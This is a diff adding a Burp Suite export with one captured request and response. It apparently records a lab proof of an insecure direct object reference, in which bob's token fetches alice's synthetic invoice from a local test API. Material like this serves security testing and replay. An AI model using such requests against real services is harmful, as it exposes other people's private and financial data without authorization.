@@ -1,0 +1,23 @@
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+]>
+<items burpVersion="2025.1" exportTime="Sat Nov 14 10:21:07 IST 2026">
+  <item>
+    <time>Sat Nov 14 10:20:55 IST 2026</time>
+    <url><![CDATA[http://localhost:8001/api/invoices/1001]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>8001</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/api/invoices/1001]]></path>
+    <request base64="true"><![CDATA[R0VUIC9hcGkvaW52b2ljZXMvMTAwMSBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjgwMDENCkF1dGhvcml6YXRpb246IEJlYXJlciBib2ItY2FwdHVyZWQtdG9rZW4tUkVEQUNUTUUNCkFjY2VwdDogYXBwbGljYXRpb24vanNvbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjANCg0K]]></request>
+    <status>200</status>
+    <responselength>217</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24NCkNvbnRlbnQtTGVuZ3RoOiAxNDUNCg0KeyJpZCI6IDEwMDEsICJvd25lciI6ICJhbGljZSIsICJvd25lcl9lbWFpbCI6ICJhbGljZUBsYWIudnVsbnJlcGxheS50ZXN0IiwgImFtb3VudCI6IDEyNTAuMCwgImNhcmRfbGFzdDQiOiAiNDI0MiIsICJtZW1vIjogIlN5bnRoZXRpYyBpbnZvaWNlIEEifQ==]]></response>
+    <comment>IDOR: bob reads alice's invoice</comment>
+  </item>
+</items>
